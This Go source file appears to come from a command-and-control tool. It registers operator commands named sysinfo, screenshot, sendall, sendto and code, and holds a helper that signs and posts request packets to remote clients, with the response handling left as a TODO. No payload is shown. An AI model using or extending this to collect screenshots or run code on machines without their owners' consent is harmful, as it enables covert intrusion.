package snippets

import (
	"fmt"
	"net/http"

	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/cmd/pc3/lib"
	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/proto"
)

var Snippets map[string]func(ctx lib.CommandContext, arg string) (string, error)

func init() {
	Snippets = map[string]func(ctx lib.CommandContext, arg string) (string, error){
		"sysinfo":    snippetSysinfo,
		"screenshot": snippetScreenshot,
		"sendall":    snippetSendall,
		"sendto":     snippetSendto,
		"code":       snippetCode,
	}
}

func sendRRToClientAwaitResponse(ctx lib.CommandContext, clientId string, packet *proto.PacketRR) (*proto.PacketRR, error) {
	data, err := proto.Marshal(packet, ctx.OwnPrivKey)
	if err != nil {
		return nil, fmt.Errorf("could not marshal packet data: %e", err)
	}

	client, err := ctx.State.ClientGet(clientId)
	if err != nil {
		return nil, fmt.Errorf("could not get client `%s` from the database: %e", clientId, err)
	}

	err = (*ctx.Radio).Send(ctx.Context, proto.Packet{
		Peer:   client.Address,
		Method: http.MethodPost,
		Route:  proto.ROUTE_RR,
		Data:   data,
	})
	if err != nil {
		return nil, fmt.Errorf("failed to send packet: %e", err)
	}

	// TODO: Wait for and return response.
	return nil, nil
}
